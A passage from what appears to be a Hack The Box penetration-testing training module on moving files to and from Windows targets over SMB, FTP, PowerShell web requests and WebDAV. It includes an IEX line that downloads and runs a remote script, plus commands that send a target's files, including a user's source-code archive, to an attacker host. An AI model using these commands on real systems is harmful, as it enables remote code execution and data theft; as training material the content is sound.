+[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Callback added for UUID <span class="hljs-number">4</span>B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Callback added for UUID <span class="hljs-number">6</span>BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Config file parsed
+[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Config file parsed
+[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Config file parsed
+</code></pre>
+<p>To download a file from the SMB server to the current working directory, we can use the following command:</p>
+<p><strong>Copy a File from the SMB Server</strong></p>
+<pre><code class="lang-cmd-session"><span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">htb</span>&gt; <span class="hljs-selector-tag">copy</span> \\192<span class="hljs-selector-class">.168</span><span class="hljs-selector-class">.220</span><span class="hljs-selector-class">.133</span>\<span class="hljs-selector-tag">share</span>\<span class="hljs-selector-tag">nc</span><span class="hljs-selector-class">.exe</span>
+
+        1 <span class="hljs-selector-tag">file</span>(<span class="hljs-selector-tag">s</span>) <span class="hljs-selector-tag">copied</span>.
+</code></pre>
+<p>New versions of Windows block unauthenticated guest access, as we can see in the following command:</p>
+<pre><code class="lang-cmd-session">C:\htb&gt; copy \\<span class="hljs-number">192.168</span>.<span class="hljs-number">220.133</span>\share\nc.exe
+
+You can<span class="hljs-symbol">'t</span> <span class="hljs-keyword">access</span> this <span class="hljs-keyword">shared</span> folder because your organization<span class="hljs-symbol">'s</span> security policies <span class="hljs-keyword">block</span> unauthenticated guest <span class="hljs-keyword">access</span>. These policies help protect your PC from unsafe <span class="hljs-keyword">or</span> malicious devices <span class="hljs-keyword">on</span> the network.
+</code></pre>
+<p>To transfer files in this scenario, we can set a username and password using our Impacket SMB server and mount the SMB server on our windows target machine:</p>
+<p><strong>Create the SMB Server with a Username and Password</strong></p>
+<pre><code class="lang-shell-session">[<span class="hljs-name">!bash!</span>]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
+
+Impacket v0.9.22 - Copyright <span class="hljs-number">2020</span> SecureAuth Corporation
+
+[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Config file parsed
+[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Callback added for UUID <span class="hljs-number">4</span>B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Callback added for UUID <span class="hljs-number">6</span>BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Config file parsed
+[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Config file parsed
+[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Config file parsed
+</code></pre>
+<p><strong>Mount the SMB Server with Username and Password</strong></p>
+<pre><code class="lang-cmd-session">C:\htb&gt; <span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> <span class="hljs-keyword">n</span>: \\192.168.220.133\share /user:<span class="hljs-keyword">test</span> <span class="hljs-keyword">test</span>
+
+The command completed successfully.
+
+C:\htb&gt; <span class="hljs-keyword">copy</span> <span class="hljs-keyword">n</span>:\nc.exe
+        1 <span class="hljs-keyword">file</span>(s) copied.
+</code></pre>
+<p>Note: You can also mount the SMB server if you receive an error when you use `copy filename \\IP\sharename`.</p>
+<hr>
+<h3 id="ftp-downloads">FTP Downloads</h3>
+<p>Another way to transfer files is using FTP (File Transfer Protocol), which use port TCP/21 and TCP/20. We can use the FTP client or PowerShell Net.WebClient to download files from an FTP server.</p>
+<p>We can configure an FTP Server in our attack host using Python3 <code>pyftpdlib</code> module. It can be installed with the following command:</p>
+<p><strong>Installing the FTP Server Python3 Module - pyftpdlib</strong></p>
+<pre><code class="lang-shell-session">[!bash!]$ sudo pip3 install pyftpdlib
+</code></pre>
+<p>Then we can specify port number 21 because, by default, <code>pyftpdlib</code> uses port 2121. Anonymous authentication is enabled by default if we don't set a user and password.</p>
+<p><strong>Setting up a Python3 FTP Server</strong></p>
+<pre><code class="lang-shell-session">[!bash!]$ sudo python3 -m pyftpdlib --port 21
+
+[I 2022<span class="hljs-string">-05</span><span class="hljs-string">-17</span> 10:09:19] concurrency model: async
+[I 2022<span class="hljs-string">-05</span><span class="hljs-string">-17</span> 10:09:19] masquerade (NAT) address: None
+[I 2022<span class="hljs-string">-05</span><span class="hljs-string">-17</span> 10:09:19] passive ports: None
+[I 2022<span class="hljs-string">-05</span><span class="hljs-string">-17</span> 10:09:19] &gt;&gt;&gt; starting FTP server on 0.0.0.0:21, pid=3210 &lt;&lt;&lt;
+</code></pre>
+<p>After the FTP server is set up, we can perform file transfers using the pre-installed FTP client from Windows or PowerShell <code>Net.WebClient</code>.</p>
+<p><strong>Transfering Files from an FTP Server Using PowerShell</strong></p>
+<pre><code class="lang-powershell-session">PS C:\htb&gt; (<span class="hljs-keyword">New</span>-Object Net.WebClient).DownloadFile(<span class="hljs-symbol">'ftp</span>://<span class="hljs-number">192.168</span>.<span class="hljs-number">49.128</span>/<span class="hljs-keyword">file</span>.txt', <span class="hljs-symbol">'C</span>:\Users\Public\ftp-<span class="hljs-keyword">file</span>.txt')
+</code></pre>
+<p>When we get a shell on a remote machine, we may not have an interactive shell. If that's the case, we can create an FTP command file to download a file. First, we need to create a file containing the commands we want to execute and then use the FTP client to use that file to download that file.</p>
+<p><strong>Create a Command File for the FTP Client and Download the Target File</strong></p>
+<pre><code class="lang-cmd-session">C:\htb&gt; echo open <span class="hljs-number">192.168</span>.<span class="hljs-number">49.128</span> &gt; ftpcommand<span class="hljs-selector-class">.txt</span>
+C:\htb&gt; echo USER anonymous &gt;&gt; ftpcommand<span class="hljs-selector-class">.txt</span>
+C:\htb&gt; echo binary &gt;&gt; ftpcommand<span class="hljs-selector-class">.txt</span>
+C:\htb&gt; echo GET file<span class="hljs-selector-class">.txt</span> &gt;&gt; ftpcommand<span class="hljs-selector-class">.txt</span>
+C:\htb&gt; echo bye &gt;&gt; ftpcommand<span class="hljs-selector-class">.txt</span>
+C:\htb&gt; ftp -v -n -s:ftpcommand<span class="hljs-selector-class">.txt</span>
+ftp&gt; open <span class="hljs-number">192.168</span>.<span class="hljs-number">49.128</span>
+Log <span class="hljs-keyword">in</span> with USER and PASS first.
+ftp&gt; USER anonymous
+
+ftp&gt; GET file<span class="hljs-selector-class">.txt</span>
+ftp&gt; bye
+
+C:\htb&gt;more file<span class="hljs-selector-class">.txt</span>
+This is <span class="hljs-selector-tag">a</span> test file
+</code></pre>
+<hr>
+<h3 id="upload-operations">Upload Operations</h3>
+<p>There are also situations such as password cracking, analysis, exfiltration, etc., where we must upload files from our target machine into our attack host. We can use the same methods we used for download operation but now for uploads. Let's see how we can accomplish uploading files in various ways.</p>
+<hr>
+<h3 id="powershell-base64-encode-decode">PowerShell Base64 Encode &amp; Decode</h3>
+<p>We saw how to decode a base64 string using Powershell. Now, let's do the reverse operation and encode a file so we can decode it on our attack host.</p>
+<p><strong>Encode File Using PowerShell</strong></p>
+<pre><code class="lang-powershell-session">PS C:<span class="hljs-symbol">\h</span>tb&gt; [Convert]::ToBase64String((Get-Content -path "C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\d</span>rivers<span class="hljs-symbol">\e</span>tc<span class="hljs-symbol">\h</span>osts" -Encoding byte))
+
+IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo=
+PS C:<span class="hljs-symbol">\h</span>tb&gt; Get-FileHash "C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\d</span>rivers<span class="hljs-symbol">\e</span>tc<span class="hljs-symbol">\h</span>osts" -Algorithm MD5 | select Hash
+
+Hash
+----
+3688374325B992DEF12793500307566D
+</code></pre>
+<p>We copy this content and paste it into our attack host, use the <code>base64</code> command to decode it, and use the <code>md5sum</code> application to confirm the transfer happened correctly.</p>
+<p><strong>Decode Base64 String in Linux</strong></p>
+<pre><code class="lang-shell-session">[!bash!]$ echo IyBDb<span class="hljs-number">3</span>B<span class="hljs-number">5</span>cml<span class="hljs-symbol">naHQgKGMpIDE5</span>OTMtMjAwOSB<span class="hljs-symbol">NaWNyb3</span><span class="hljs-symbol">NvZnQgQ29</span>ycC<span class="hljs-number">4</span><span class="hljs-symbol">NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1</span><span class="hljs-symbol">NUUyBmaWxlIHVzZWQgYnkgTWljcm9</span>zb<span class="hljs-number">2</span>Z<span class="hljs-number">0</span>IFRDUC<span class="hljs-number">9</span>JUCBmb<span class="hljs-number">3</span>IgV<span class="hljs-number">2</span>luZ<span class="hljs-name">G93</span>cy<span class="hljs-number">4</span><span class="hljs-symbol">NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5</span>zIHRoZSBtYXBwaW<span class="hljs-number">5</span><span class="hljs-symbol">ncyBvZiBJUCBhZGRyZXNzZXMgdG8</span>ga<span class="hljs-name">G9</span>zdCBuYW<span class="hljs-number">1</span>lcy<span class="hljs-number">4</span>gRWFjaA<span class="hljs-number">0</span>KIyBlb<span class="hljs-symbol">nRyeSBzaG91</span>bGQgYmUga<span class="hljs-number">2</span>VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZX<span class="hljs-symbol">NzIHNob3</span><span class="hljs-attr">VsZA0</span>KIyBiZSBwbGFjZWQgaW<span class="hljs-number">4</span>gdGhlIGZpc<span class="hljs-symbol">nN0</span>IG<span class="hljs-symbol">NvbHVtbiBmb2</span>xsb<span class="hljs-number">3</span>dlZCBieSB<span class="hljs-number">0</span>aGUgY<span class="hljs-number">29</span>ycmVzc<span class="hljs-name">G9</span>uZGluZyBob<span class="hljs-number">3</span><span class="hljs-symbol">N0</span>I<span class="hljs-name">G5</span>hbWUuDQojIFRoZSBJUCBhZGRyZX<span class="hljs-symbol">NzIGFuZCB0</span>aGUga<span class="hljs-name">G9</span>zdCBuYW<span class="hljs-number">1</span>lIH<span class="hljs-symbol">Nob3</span><span class="hljs-attr">VsZCBiZSBzZXBhcmF0</span>ZWQgY<span class="hljs-symbol">nkgYXQgbGVhc3</span>Qgb<span class="hljs-number">25</span>lDQojIH<span class="hljs-symbol">NwYWNlLg0</span>KIw<span class="hljs-number">0</span>KIyBBZGRpdGlvbmFsbHksIG<span class="hljs-symbol">NvbW1</span>lb<span class="hljs-symbol">nRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5</span>zZXJ<span class="hljs-number">0</span>ZWQgb<span class="hljs-number">24</span>gaW<span class="hljs-number">5</span>kaXZpZHVhbA<span class="hljs-number">0</span>KIyBsaW<span class="hljs-number">5</span>lcyB<span class="hljs-attr">vciBmb2</span>xsb<span class="hljs-number">3</span>dpbmcgdGhlI<span class="hljs-name">G1</span>hY<span class="hljs-number">2</span>hpbmUgbmFtZSBkZW<span class="hljs-number">5</span>vdGVkIGJ<span class="hljs-number">5</span>IGEgJyM<span class="hljs-symbol">nIHN5</span>bWJvbC<span class="hljs-number">4</span><span class="hljs-symbol">NCiMNCiMgRm9</span>yIGV<span class="hljs-number">4</span>YW<span class="hljs-number">1</span>wbGU<span class="hljs-number">6</span>DQojDQojICAgICAgMTAyLjU<span class="hljs-number">0</span>Ljk<span class="hljs-number">0</span>Ljk<span class="hljs-number">3</span>ICAgICByaGluby<span class="hljs-number">5</span>hY<span class="hljs-number">21</span>lLm<span class="hljs-symbol">NvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2</span>ZXI<span class="hljs-symbol">NCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5</span>jb<span class="hljs-number">20</span>gICAgICAgICAgICAgICMgeCBjbGllb<span class="hljs-symbol">nQgaG9</span>zdA<span class="hljs-number">0</span>KDQojIGxvY<span class="hljs-number">2</span>Fsa<span class="hljs-name">G9</span>zdCBuYW<span class="hljs-number">1</span>lIHJlc<span class="hljs-number">29</span>sdXRpb<span class="hljs-number">24</span>gaXMgaGFuZGxlZCB<span class="hljs-number">3</span>aXRoaW<span class="hljs-number">4</span>gRE<span class="hljs-number">5</span>TIGl<span class="hljs-number">0</span>c<span class="hljs-number">2</span><span class="hljs-attr">VsZi4</span><span class="hljs-symbol">NCiMJMTI3</span>LjAuMC<span class="hljs-number">4</span>xICAgICAgIGxvY<span class="hljs-number">2</span>Fsa<span class="hljs-name">G9</span>zdA<span class="hljs-number">0</span>KIwk<span class="hljs-number">6</span>OjEgICAgICAgICAgICAgb<span class="hljs-name">G9</span>jYWxob<span class="hljs-number">3</span><span class="hljs-symbol">N0</span>DQo= | base<span class="hljs-number">64</span> -d &gt; hosts
+</code></pre>
+<pre><code class="lang-shell-session">[!bash!]$ md5sum hosts 
+
+<span class="hljs-number">3688374325</span>b992def12793500307566d  hosts
+</code></pre>
+<hr>
+<h3 id="powershell-web-uploads">PowerShell Web Uploads</h3>
+<p>PowerShell doesn't have a built-in function for upload operations, but we can use <code>Invoke-WebRequest</code> or <code>Invoke-RestMethod</code> to build our upload function. We'll also need a web server that accepts uploads, which is not a default option in most common webserver utilities.</p>
+<p>For our web server, we can use <a href="https://github.com/Densaugeo/uploadserver">uploadserver</a>, an extended module of the Python <a href="https://docs.python.org/3/library/http.server.html">HTTP.server module</a>, which includes a file upload page. Let's install it and start the webserver.</p>
+<p><strong>Installing a Configured WebServer with Upload</strong></p>
+<pre><code class="lang-shell-session">[!<span class="hljs-keyword">bash!]$ </span>pip3 <span class="hljs-keyword">install </span>uploadserver
+
+Collecting upload server
+  Using <span class="hljs-keyword">cached </span>uploadserver-2.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>-py3-none-any.whl (<span class="hljs-number">6</span>.<span class="hljs-number">9</span> kB)
+<span class="hljs-keyword">Installing </span>collected packages: uploadserver
+Successfully <span class="hljs-keyword">installed </span>uploadserver-2.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>
+</code></pre>
+<pre><code class="lang-shell-session">[!bash!]$ python3 -m uploadserver
+
+File upload available <span class="hljs-meta">at</span> /upload
+Serving HTTP on <span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span> port <span class="hljs-number">8000</span> (http://<span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>:<span class="hljs-number">8000</span>/) ...
+</code></pre>
+<p>Now we can use a PowerShell script <a href="https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1">PSUpload.ps1</a> which uses <code>Invoke-RestMethod</code> to perform the upload operations. The script accepts two parameters <code>-File</code>, which we use to specify the file path, and <code>-Uri</code>, the server URL where we'll upload our file. Let's attempt to upload the host file from our Windows host.</p>
+<p><strong>PowerShell Script to Upload a File to Python Upload Server</strong></p>
+<pre><code class="lang-powershell-session">PS C:<span class="hljs-symbol">\h</span>tb&gt; IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
+PS C:<span class="hljs-symbol">\h</span>tb&gt; Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\d</span>rivers<span class="hljs-symbol">\e</span>tc<span class="hljs-symbol">\h</span>osts
+
+[+] File Uploaded:  C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\d</span>rivers<span class="hljs-symbol">\e</span>tc<span class="hljs-symbol">\h</span>osts
+[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
+</code></pre>
+<h4 id="powershell-base64-web-upload">PowerShell Base64 Web Upload</h4>
+<p>Another way to use PowerShell and base64 encoded files for upload operations is by using <code>Invoke-WebRequest</code> or <code>Invoke-RestMethod</code> together with Netcat. We use Netcat to listen in on a port we specify and send the file as a <code>POST</code> request. Finally, we copy the output and use the base64 decode function to convert the base64 string into a file.</p>
+<pre><code class="lang-powershell-session">PS C:<span class="hljs-symbol">\h</span>tb&gt; <span class="hljs-keyword">$b64 = [System.convert]::ToBase64String</span>((Get-Content -Path 'C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\d</span>rivers<span class="hljs-symbol">\e</span>tc<span class="hljs-symbol">\h</span>osts' -Encoding Byte))
+PS C:<span class="hljs-symbol">\h</span>tb&gt; Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body <span class="hljs-keyword">$b64</span>
+</code></pre>
+<p>We catch the base64 data with Netcat and use the base64 application with the decode option to convert the string to the file.</p>
+<pre><code class="lang-shell-session">[!bash!]$ nc -lvnp <span class="hljs-number">8000</span>
+
+listening on [any] <span class="hljs-number">8000</span> ...
+connect to [<span class="hljs-number">192.168</span><span class="hljs-number">.49</span><span class="hljs-number">.128</span>] from (UNKNOWN) [<span class="hljs-number">192.168</span><span class="hljs-number">.49</span><span class="hljs-number">.129</span>] <span class="hljs-number">50923</span>
+POST <span class="hljs-regexp">/ HTTP/</span><span class="hljs-number">1.1</span>
+User-<span class="hljs-string">Agent:</span> Mozilla<span class="hljs-regexp">/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/</span><span class="hljs-number">5.1</span><span class="hljs-number">.19041</span><span class="hljs-number">.1682</span>
+Content-<span class="hljs-string">Type:</span> application/x-www-form-urlencoded
+<span class="hljs-string">Host:</span> <span class="hljs-number">192.168</span><span class="hljs-number">.49</span><span class="hljs-number">.128</span>:<span class="hljs-number">8000</span>
+Content-<span class="hljs-string">Length:</span> <span class="hljs-number">1820</span>
+<span class="hljs-string">Connection:</span> Keep-Alive
+
+IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQo
+...SNIP...
+</code></pre>
+<pre><code class="lang-shell-session">[!<span class="hljs-keyword">bash!]$ </span>echo &lt;<span class="hljs-keyword">base64&gt; </span><span class="hljs-title">| base64 -d -w 0 &gt; hosts</span>
+</code></pre>
+<hr>
+<h3 id="smb-uploads">SMB Uploads</h3>
+<p>We previously discussed that companies usually allow outbound traffic using <code>HTTP</code> (TCP/80) and <code>HTTPS</code> (TCP/443) protocols. Commonly enterprises don't allow the SMB protocol (TCP/445) out of their internal network because this can open them up to potential attacks. For more information on this, we can read the Microsoft post <a href="https://support.microsoft.com/en-us/topic/preventing-smb-traffic-from-lateral-connections-and-entering-or-leaving-the-network-c0541db7-2244-0dce-18fd-14a3ddeb282a">Preventing SMB traffic from lateral connections and entering or leaving the network</a>.</p>
+<p>An alternative is to run SMB over HTTP with <code>WebDav</code>. <code>WebDAV</code> <a href="https://datatracker.ietf.org/doc/html/rfc4918">(RFC 4918)</a> is an extension of HTTP, the internet protocol that web browsers and web servers use to communicate with each other. The <code>WebDAV</code> protocol enables a webserver to behave like a fileserver, supporting collaborative content authoring. <code>WebDAV</code> can also use HTTPS.</p>
+<p>When you use <code>SMB</code>, it will first attempt to connect using the SMB protocol, and if there's no SMB share available, it will try to connect using HTTP. In the following Wireshark capture, we attempt to connect to the file share <code>testing3</code>, and because it didn't find anything with <code>SMB</code>, it uses <code>HTTP</code>.</p>
+<p><img src="storage\modules\24\smb-webdav-wireshark.png" alt="Image"></p>
+<p><strong>Configuring WebDav Server</strong></p>
+<p>To set up our WebDav server, we need to install two Python modules, <code>wsgidav</code> and <code>cheroot</code> (you can read more about this implementation here: <a href="https://github.com/mar10/wsgidav">wsgidav github</a>). After installing them, we run the <code>wsgidav</code> application in the target directory.</p>
+<p><strong>Installing WebDav Python modules</strong></p>
+<pre><code class="lang-shell-session">[<span class="hljs-name">!bash!</span>]$ sudo pip3 install wsgidav cheroot
+
+[<span class="hljs-name">sudo</span>] password for plaintext: 
+Collecting wsgidav
+  Downloading WsgiDAV-4.0.1-py3-none-any.whl (<span class="hljs-name">171</span> kB)
+     |████████████████████████████████| <span class="hljs-number">171</span> kB <span class="hljs-number">1.4</span> MB/s
+     ...SNIP...
+</code></pre>
+<p><strong>Using the WebDav Python module</strong></p>
+<pre><code class="lang-shell-session">[!bash!]$ sudo wsgidav --host=<span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> --port=<span class="hljs-number">80</span> --root=/tmp --auth=anonymous 
+
+[sudo] password <span class="hljs-keyword">for</span> <span class="hljs-string">plaintext:</span> 
+Running without configuration file.
+<span class="hljs-number">10</span>:<span class="hljs-number">02</span>:<span class="hljs-number">53.949</span> - <span class="hljs-string">WARNING :</span> App wsgidav.mw.cors.Cors(None).is_disabled() returned <span class="hljs-string">True:</span> skipping.
+<span class="hljs-number">10</span>:<span class="hljs-number">02</span>:<span class="hljs-number">53.950</span> - <span class="hljs-string">INFO    :</span> WsgiDAV<span class="hljs-regexp">/4.0.1 Python/</span><span class="hljs-number">3.9</span><span class="hljs-number">.2</span> Linux<span class="hljs-number">-5.15</span><span class="hljs-number">.0</span><span class="hljs-number">-15</span>parrot1-amd64-x86_64-with-glibc2<span class="hljs-number">.31</span>
+<span class="hljs-number">10</span>:<span class="hljs-number">02</span>:<span class="hljs-number">53.950</span> - <span class="hljs-string">INFO    :</span> Lock <span class="hljs-string">manager:</span>      LockManager(LockStorageDict)
+<span class="hljs-number">10</span>:<span class="hljs-number">02</span>:<span class="hljs-number">53.950</span> - <span class="hljs-string">INFO    :</span> Property <span class="hljs-string">manager:</span>  None
+<span class="hljs-number">10</span>:<span class="hljs-number">02</span>:<span class="hljs-number">53.950</span> - <span class="hljs-string">INFO    :</span> Domain <span class="hljs-string">controller:</span> SimpleDomainController()
+<span class="hljs-number">10</span>:<span class="hljs-number">02</span>:<span class="hljs-number">53.950</span> - <span class="hljs-string">INFO    :</span> Registered DAV providers by <span class="hljs-string">route:</span>
+<span class="hljs-number">10</span>:<span class="hljs-number">02</span>:<span class="hljs-number">53.950</span> - <span class="hljs-string">INFO    :</span>   - <span class="hljs-string">'/:dir_browser'</span>: FilesystemProvider <span class="hljs-keyword">for</span> path <span class="hljs-string">'/usr/local/lib/python3.9/dist-packages/wsgidav/dir_browser/htdocs'</span> (Read-Only) (anonymous)
+<span class="hljs-number">10</span>:<span class="hljs-number">02</span>:<span class="hljs-number">53.950</span> - <span class="hljs-string">INFO    :</span>   - <span class="hljs-string">'/'</span>: FilesystemProvider <span class="hljs-keyword">for</span> path <span class="hljs-string">'/tmp'</span> (Read-Write) (anonymous)
+<span class="hljs-number">10</span>:<span class="hljs-number">02</span>:<span class="hljs-number">53.950</span> - <span class="hljs-string">WARNING :</span> Basic authentication is <span class="hljs-string">enabled:</span> It is highly recommended to enable SSL.
+<span class="hljs-number">10</span>:<span class="hljs-number">02</span>:<span class="hljs-number">53.950</span> - <span class="hljs-string">WARNING :</span> Share <span class="hljs-string">'/'</span> will allow anonymous write access.
+<span class="hljs-number">10</span>:<span class="hljs-number">02</span>:<span class="hljs-number">53.950</span> - <span class="hljs-string">WARNING :</span> Share <span class="hljs-string">'/:dir_browser'</span> will allow anonymous read access.
+<span class="hljs-number">10</span>:<span class="hljs-number">02</span>:<span class="hljs-number">54.194</span> - <span class="hljs-string">INFO    :</span> Running WsgiDAV<span class="hljs-regexp">/4.0.1 Cheroot/</span><span class="hljs-number">8.6</span><span class="hljs-number">.0</span> Python <span class="hljs-number">3.9</span><span class="hljs-number">.2</span>
+<span class="hljs-number">10</span>:<span class="hljs-number">02</span>:<span class="hljs-number">54.194</span> - <span class="hljs-string">INFO    :</span> Serving on <span class="hljs-string">http:</span><span class="hljs-comment">//0.0.0.0:80 ...</span>
+</code></pre>
+<p><strong>Connecting to the Webdav Share</strong></p>
+<p>Now we can attempt to connect to the share using the <code>DavWWWRoot</code> directory.</p>
+<pre><code class="lang-cmd-session">C:\htb&gt; dir \\<span class="hljs-number">192.168.49.128</span>\DavWWWRoot
+
+ Volume in drive \\<span class="hljs-number">192.168.49.128</span>\DavWWWRoot has no label.
+ Volume Serial Number is <span class="hljs-number">0000-0000</span>
+
+ Directory of \\<span class="hljs-number">192.168.49.128</span>\DavWWWRoot
+
+<span class="hljs-number">05/18/2022</span>  <span class="hljs-number">10</span>:<span class="hljs-number">05</span> AM    &lt;DIR&gt;          .
+<span class="hljs-number">05/18/2022</span>  <span class="hljs-number">10</span>:<span class="hljs-number">05</span> AM    &lt;DIR&gt;          ..
+<span class="hljs-number">05/18/2022</span>  <span class="hljs-number">10</span>:<span class="hljs-number">05</span> AM    &lt;DIR&gt;          sharefolder
+<span class="hljs-number">05/18/2022</span>  <span class="hljs-number">10</span>:<span class="hljs-number">05</span> AM                <span class="hljs-number">13</span> filetest.txt
+               <span class="hljs-number">1</span> File(s)             <span class="hljs-number">13</span> bytes
+               <span class="hljs-number">3</span> Dir(s)  <span class="hljs-number">43</span>,<span class="hljs-number">443,318</span>,<span class="hljs-number">784</span> bytes free
+</code></pre>
+<p>Note: <code>DavWWWRoot</code> is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server.</p>
+<p>You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: \192.168.49.128\sharefolder</p>
+<p><strong>Uploading Files using SMB</strong></p>
+<pre><code class="lang-cmd-session">C:<span class="hljs-tag">\<span class="hljs-name">htb</span></span>&gt; copy C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">john</span></span><span class="hljs-tag">\<span class="hljs-name">Desktop</span></span><span class="hljs-tag">\<span class="hljs-name">SourceCode</span></span>.zip <span class="hljs-tag">\<span class="hljs-name">\</span></span>192.168.49.129<span class="hljs-tag">\<span class="hljs-name">DavWWWRoot</span></span><span class="hljs-tag">\<span class="hljs-name">
+</span></span>C:<span class="hljs-tag">\<span class="hljs-name">htb</span></span>&gt; copy C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">john</span></span><span class="hljs-tag">\<span class="hljs-name">Desktop</span></span><span class="hljs-tag">\<span class="hljs-name">SourceCode</span></span>.zip <span class="hljs-tag">\<span class="hljs-name">\</span></span>192.168.49.129<span class="hljs-tag">\<span class="hljs-name">sharefolder</span></span><span class="hljs-tag">\</span>
+</code></pre>
+<p>Note: If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.</p>
+<hr>
+<h3 id="ftp-uploads">FTP Uploads</h3>
